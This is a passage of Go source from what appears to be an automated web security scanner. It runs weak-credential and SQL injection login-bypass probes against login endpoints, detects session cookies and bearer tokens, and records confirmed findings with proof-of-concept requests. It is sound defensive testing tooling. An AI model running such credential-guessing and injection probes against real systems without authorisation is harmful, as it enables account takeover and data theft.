		"selects to the left and right of union do not have the same number",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func looksLikeCredentialExfil(body string) bool {
	return sqliExfilEmailRegex.MatchString(body) && sqliExfilHashRegex.MatchString(body)
}

// rewriteQueryParam replaces (or adds) the named query parameter with the
// given value, preserving the rest of the URL's query string.
func rewriteQueryParam(rawURL, key, value string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		// Fallback: append naively.
		sep := "?"
		if strings.Contains(rawURL, "?") {
			sep = "&"
		}
		return rawURL + sep + key + "=" + url.QueryEscape(value)
	}
	q := u.Query()
	q.Set(key, value)
	u.RawQuery = q.Encode()
	return u.String()
}

// execWeakCredentials runs each payload as a (user:pass) pair against the
// target login endpoint. Stops at the first confirmation.
func (e *Executor) execWeakCredentials(ctx context.Context, plan ProbePlan) (bool, error) {
	usernameField, passwordField := authLoginFields(plan)
	baselineBody, baselineContentType := buildLoginBody(plan.Target.BodyType, usernameField, passwordField,
		"aobtd-nonexistent-user@example.com", "wrong-password-12345")
	baseline, _ := e.sendReasonerLoginProbe(ctx, plan, baselineBody, baselineContentType)

	for _, p := range plan.Payloads {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		user, pass, ok := splitCredential(p)
		if !ok {
			continue
		}
		body, contentType := buildLoginBody(plan.Target.BodyType, usernameField, passwordField, user, pass)
		result, ok := e.sendReasonerLoginProbe(ctx, plan, body, contentType)
		if !ok {
			continue
		}

		if !matchConfirmation(plan.Confirmation, result.Response, result.Body) {
			continue
		}
		if result.AuthSignal == "" {
			e.logger.Info("weak_credentials plan matched generic confirmation but did not produce auth artifact",
				"url", plan.Target.URL, "status", result.Status)
			continue
		}
		if reasonerAuthResultMatchesBaseline(result, baseline) {
			e.logger.Info("weak_credentials plan matched bogus-baseline auth signal; treating as login-shell/session-cookie false positive",
				"url", plan.Target.URL, "status", result.Status, "auth_signal", result.AuthSignal)
			continue
		}
		// Confirmed.
		e.emitFinding(plan, p, result.Status, result.Body,
			types.SeverityCritical, "weak_credentials",
			fmt.Sprintf("Weak / default credentials accepted at %s (%s:%s) [via %s]",
				plan.Target.URL, user, pass, plan.SourceReasoner),
			fmt.Sprintf("POST %s with credentials `%s` / `%s` returned a response with a concrete auth signal (%s) that differed from the bogus baseline. Plan produced by %s with rationale: %s",
				plan.Target.URL, user, pass, result.AuthSignal, plan.SourceReasoner, plan.Rationale))
		return true, nil
	}
	return false, nil
}

// execSQLiLoginBypass tries each payload in the login identifier field.
func (e *Executor) execSQLiLoginBypass(ctx context.Context, plan ProbePlan) (bool, error) {
	usernameField, passwordField := authLoginFields(plan)
	baselineBody, baselineContentType := buildLoginBody(plan.Target.BodyType, usernameField, passwordField,
		"aobtd-nonexistent-user@example.com", "wrong-password-12345")
	baseline, _ := e.sendReasonerLoginProbe(ctx, plan, baselineBody, baselineContentType)

	for _, payload := range plan.Payloads {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		body, contentType := buildLoginBody(plan.Target.BodyType, usernameField, passwordField, payload, "x")
		result, ok := e.sendReasonerLoginProbe(ctx, plan, body, contentType)
		if !ok {
			continue
		}

		if !matchConfirmation(plan.Confirmation, result.Response, result.Body) {
			continue
		}
		if result.AuthSignal == "" {
			e.logger.Info("sqli_login_bypass plan matched generic confirmation but did not produce auth artifact",
				"url", plan.Target.URL, "status", result.Status)
			continue
		}
		if reasonerAuthResultMatchesBaseline(result, baseline) {
			e.logger.Info("sqli_login_bypass plan matched bogus-baseline auth signal; treating as login-shell/session-cookie false positive",
				"url", plan.Target.URL, "status", result.Status, "auth_signal", result.AuthSignal)
			continue
		}
		e.emitFinding(plan, payload, result.Status, result.Body,
			types.SeverityCritical, "sqli",
			fmt.Sprintf("SQL injection login bypass at %s [via %s]",
				plan.Target.URL, plan.SourceReasoner),
			fmt.Sprintf("SQL payload `%s` in the login identifier field produced a concrete auth signal (%s) that differed from the bogus baseline. Plan produced by %s with rationale: %s",
				payload, result.AuthSignal, plan.SourceReasoner, plan.Rationale))
		return true, nil
	}
	return false, nil
}

// ── helpers ───────────────────────────────────────────────────────────

func authLoginFields(plan ProbePlan) (usernameField, passwordField string) {
	if plan.Target.Headers != nil {
		usernameField = strings.TrimSpace(plan.Target.Headers["auth_username_field"])
		passwordField = strings.TrimSpace(plan.Target.Headers["auth_password_field"])
	}
	if usernameField == "" {
		usernameField = "email"
	}
	if passwordField == "" {
		passwordField = "password"
	}
	return usernameField, passwordField
}

func buildLoginBody(bodyType, usernameField, passwordField, user, pass string) (body, contentType string) {
	if strings.EqualFold(strings.TrimSpace(bodyType), "form") {
		values := url.Values{}
		values.Set(usernameField, user)
		values.Set(passwordField, pass)
		return values.Encode(), "application/x-www-form-urlencoded"
	}
	payload := map[string]string{
		usernameField: user,
		passwordField: pass,
	}
	encoded, _ := json.Marshal(payload)
	return string(encoded), "application/json"
}

type reasonerLoginProbeResult struct {
	Response   *http.Response
	Status     int
	Body       []byte
	AuthSignal string
}

func (e *Executor) sendReasonerLoginProbe(ctx context.Context, plan ProbePlan, body, contentType string) (reasonerLoginProbeResult, bool) {
	method := strings.ToUpper(strings.TrimSpace(plan.Target.Method))
	if method == "" {
		method = http.MethodPost
	}
	req, err := http.NewRequestWithContext(ctx, method, plan.Target.URL, strings.NewReader(body))
	if err != nil {
		return reasonerLoginProbeResult{}, false
	}
	req.Header.Set("Content-Type", contentType)
	applyPlanHeaders(req, plan.Target.Headers)
	req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner)

	resp, err := e.client.Do(req)
	if err != nil || resp == nil {
		return reasonerLoginProbeResult{}, false
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return reasonerLoginProbeResult{
		Response:   resp,
		Status:     resp.StatusCode,
		Body:       respBody,
		AuthSignal: reasonerAuthSuccessSignal(resp, respBody),
	}, true
}

func reasonerAuthResultMatchesBaseline(result, baseline reasonerLoginProbeResult) bool {
	if baseline.Status == 0 || baseline.AuthSignal == "" {
		return false
	}
	return result.Status == baseline.Status &&
		result.AuthSignal == baseline.AuthSignal &&
		approxSameSize(len(result.Body), len(baseline.Body))
}

func reasonerAuthSuccessSignal(resp *http.Response, body []byte) string {
	if resp == nil {
		return ""
	}
	if token := extractBearerToken(string(body)); token != "" {
		return "token in response body"
	}
	if token := bearerTokenFromHeader(resp.Header.Get("Authorization")); token != "" {
		return "Authorization bearer header"
	}
	if token := bearerTokenFromText(string(body)); token != "" {
		return "Bearer token in response body"
	}
	for _, raw := range resp.Header.Values("Set-Cookie") {
		name, value, ok := parseSetCookieNameValue(raw)
		if !ok || !isLikelyReasonerSessionCookie(name) || len(strings.TrimSpace(value)) < 6 {
			continue
		}
		return "Set-Cookie " + name
	}
	return ""
}

func bearerTokenFromHeader(raw string) string {
	parts := strings.Fields(strings.TrimSpace(raw))
	if len(parts) == 2 && strings.EqualFold(parts[0], "Bearer") && len(parts[1]) >= 8 {
		return parts[1]
	}
	return ""
}

var reasonerBearerTokenRE = regexp.MustCompile(`(?i)\bbearer\s+([A-Za-z0-9._~+/=-]{8,})`)

func bearerTokenFromText(raw string) string {
	match := reasonerBearerTokenRE.FindStringSubmatch(raw)
	if len(match) != 2 {
		return ""
	}
	return strings.TrimSpace(match[1])
}

func parseSetCookieNameValue(raw string) (name, value string, ok bool) {
	first := strings.TrimSpace(strings.Split(raw, ";")[0])
	if first == "" {
		return "", "", false
	}
	parts := strings.SplitN(first, "=", 2)
	if len(parts) != 2 {
		return "", "", false
	}
	name = strings.TrimSpace(parts[0])
	value = strings.TrimSpace(parts[1])
	return name, value, name != "" && value != ""
}

func isLikelyReasonerSessionCookie(name string) bool {
	lower := strings.ToLower(strings.TrimSpace(name))
	if lower == "" || strings.Contains(lower, "csrf") || strings.Contains(lower, "xsrf") {
		return false
	}
	for _, marker := range []string{
		"session", "sid", "sess", "auth", "token", "jwt", "bearer", "access",
		"connect.sid", "phpsessid", "jsessionid", "laravel_session",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func applyPlanHeaders(req *http.Request, headers map[string]string) {
	for k, v := range headers {
		if isPlanControlHeader(k) {
			continue
		}
		req.Header.Set(k, v)
	}
}

func (e *Executor) applyProbeHeaders(req *http.Request, headers map[string]string) {
	applyPlanHeaders(req, headers)
	if e == nil || e.db == nil || requestHasAuthHeader(req) || req.URL == nil {
		return
	}
	observed, _, err := e.db.BestCredentialHeaders(e.scanID, req.URL.String())
	if err != nil || len(observed) == 0 {
		return
	}
	for k, v := range observed {
		if req.Header.Get(k) == "" {
			req.Header.Set(k, v)
		}
	}
}

func requestHasAuthHeader(req *http.Request) bool {
	if req == nil {
		return false
	}
	for _, key := range []string{
		"Authorization", "Cookie", "X-API-Key", "X-Auth-Token",
		"X-Access-Token", "X-CSRF-Token", "X-CSRFToken", "X-XSRF-Token",
	} {
		if strings.TrimSpace(req.Header.Get(key)) != "" {
			return true
		}
	}
	return false
}

func isPlanControlHeader(k string) bool {
	k = strings.ToLower(strings.TrimSpace(k))
	return strings.HasPrefix(k, "auth_") ||
		strings.HasPrefix(k, "bola_") ||
		strings.HasPrefix(k, "chain_")
}

// splitCredential parses `user:pass` with the first `:` as the separator
// so passwords can contain colons.
func splitCredential(s string) (user, pass string, ok bool) {
	i := strings.Index(s, ":")
	if i < 1 || i == len(s)-1 {
		return "", "", false
	}
	return s[:i], s[i+1:], true
}

// matchConfirmation evaluates a ConfirmationRule against a response.
// Returns true if:
//   - status_codes empty OR resp matches one, AND
//   - body_contains empty OR body contains at least one, AND
//   - body_absent empty OR body does NOT contain any, AND
//   - header_present empty OR all are present, AND
//   - body length ≥ min_body_bytes
func matchConfirmation(rule ConfirmationRule, resp *http.Response, body []byte) bool {
	if len(rule.StatusCodes) > 0 {
		found := false
		for _, s := range rule.StatusCodes {
			if resp.StatusCode == s {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	lower := strings.ToLower(string(body))
	if len(rule.BodyContains) > 0 {
		found := false
		for _, kw := range rule.BodyContains {
			if strings.Contains(lower, strings.ToLower(kw)) {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	for _, kw := range rule.BodyAbsent {
		if strings.Contains(lower, strings.ToLower(kw)) {
			return false
		}
	}
	for _, h := range rule.HeaderPresent {
		if resp.Header.Get(h) == "" {
			return false
		}
	}
	if rule.MinBodyBytes > 0 && len(body) < rule.MinBodyBytes {
		return false
	}
	return true
}

func graphQLSyntaxErrorResponse(rawURL string, status int, body []byte) bool {
	if status < 400 || !strings.Contains(strings.ToLower(rawURL), "graphql") {
		return false
	}
	lower := strings.ToLower(string(body))
	if strings.Contains(lower, "sql") ||
		strings.Contains(lower, "sqlite") ||
		strings.Contains(lower, "database") {
		return false
	}
	return strings.Contains(lower, "syntax error graphql") ||
		(strings.Contains(lower, "expected name") && strings.Contains(lower, "graphql")) ||
		(strings.Contains(lower, "unexpected") && strings.Contains(lower, "graphql")) ||
		strings.Contains(lower, "must have a sub selection") ||
		strings.Contains(lower, "cannot query field") ||
		strings.Contains(lower, "unknown argument") ||
		strings.Contains(lower, "expected type")
}

func buildReasonerPocRequest(plan ProbePlan, payload string) string {
	method := strings.ToUpper(strings.TrimSpace(plan.Target.Method))
	if method == "" {
		method = "GET"
	}
	return buildReasonerPocRequestForURL(method, plan.Target.URL, payload)
}

func buildReasonerPocRequestForURL(method, rawURL, payload string) string {
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = http.MethodGet
	}
	parsed, err := url.Parse(rawURL)
	if err != nil {
		if method == http.MethodGet || method == http.MethodHead || method == http.MethodOptions {
			return fmt.Sprintf("%s %s HTTP/1.1\n\n# payload: %s", method, rawURL, payload)
		}
		return fmt.Sprintf("%s %s HTTP/1.1\n\n{payload=%s}", method, rawURL, payload)
	}
	requestURI := parsed.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}
	if parsed.Scheme == "" || parsed.Host == "" {
		if method == http.MethodGet || method == http.MethodHead || method == http.MethodOptions {
			return fmt.Sprintf("%s %s HTTP/1.1\n\n# payload: %s", method, requestURI, payload)
		}
		return fmt.Sprintf("%s %s HTTP/1.1\n\n{payload=%s}", method, requestURI, payload)
	}
	if method == http.MethodGet || method == http.MethodHead || method == http.MethodOptions {
		return fmt.Sprintf("%s %s HTTP/1.1\nHost: %s\n\n# payload: %s",
			method, requestURI, parsed.Host, payload)
	}
	return fmt.Sprintf("%s %s HTTP/1.1\nHost: %s\n\n{payload=%s}",
		method, requestURI, parsed.Host, payload)
}

// emitFinding stores a confirmed finding from a reasoner-dispatched plan.
func (e *Executor) emitFinding(plan ProbePlan, payload string, status int, body []byte,
	severity types.Severity, vulnType, title, description string) {
	e.emitFindingWithRequestURL(plan, payload, plan.Target.URL, plan.Target.Method, status, body,
		severity, vulnType, title, description)
}

func (e *Executor) emitFindingWithRequestURL(plan ProbePlan, payload, requestURL, method string, status int, body []byte,
	severity types.Severity, vulnType, title, description string) {
	requestURL = strings.TrimSpace(requestURL)
	if requestURL == "" {
		requestURL = plan.Target.URL
	}
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = strings.ToUpper(strings.TrimSpace(plan.Target.Method))
	}
	if method == "" {
		method = http.MethodGet
	}
	if e.db.FindingExists(e.scanID, title, requestURL) {
		return
	}
	f := types.Finding{
		Title:       title,
		Description: description,
		Severity:    severity,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + requestURL,
		VulnType:    vulnType,
		ParamName:   strings.TrimSpace(plan.Target.Field),
		Payload:     payload,
		PocRequest:  buildReasonerPocRequestForURL(method, requestURL, payload),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, proofResponseBody(vulnType, body, 800)),
		StepsToReproduce: fmt.Sprintf("1. Send the %s request shown in the proof of exploitation.\n"+
			"2. Confirm the payload `%s` is applied to `%s`.\n"+
			"3. Compare with a benign baseline request and observe the response evidence described below.",
			method, payload, strings.TrimSpace(plan.Target.Field)),
		Evidence: fmt.Sprintf("Reasoner: %s\nRationale: %s\nStatus: %d\nBody preview: %s",
			plan.SourceReasoner, plan.Rationale, status, truncate(string(body), 300)),
	}
	e.db.InsertFinding(e.scanID, f)
	e.db.InsertNarration(e.scanID, "reasoner", "confirmed",
		fmt.Sprintf("%s plan confirmed: %s", plan.SourceReasoner, title),
		requestURL, nil)
}

// proofResponseBody keeps a bounded response while preferring the evidence
// that caused an impact finding to be confirmed. A prefix-only truncation can
// preserve an HTML header and discard the schema row or credential marker that
// actually proves exploitation.
func proofResponseBody(vulnType string, body []byte, limit int) string {
	text := string(body)
	if limit <= 0 || len(text) <= limit {
		return text
	}
	lower := strings.ToLower(text)
	index := -1
	markers := []string{}
	switch strings.ToLower(strings.TrimSpace(vulnType)) {
	case "sqli_schema_exposure":
		markers = []string{"create table", "table_name", "column_name"}
	case "sqli_credential_exfiltration":
		if match := sqliExfilEmailRegex.FindStringIndex(text); match != nil {
			index = match[0]
		} else if match := sqliExfilHashRegex.FindStringIndex(text); match != nil {
			index = match[0]
		}
	}
	if index < 0 {
		for _, marker := range markers {
			if candidate := strings.Index(lower, marker); candidate >= 0 && (index < 0 || candidate < index) {
				index = candidate
			}
		}
	}
	if index < 0 {
		return truncate(text, limit)
	}
	start := index - limit/3
	if start < 0 {
		start = 0
	}
	end := start + limit
	if end > len(text) {
		end = len(text)
		start = end - limit
		if start < 0 {
			start = 0
		}
	}
	preview := text[start:end]
	if start > 0 {
		preview = "... [earlier response omitted] ...\n" + preview
	}
	if end < len(text) {
		preview += "\n... [later response omitted] ..."
	}
	return preview
}
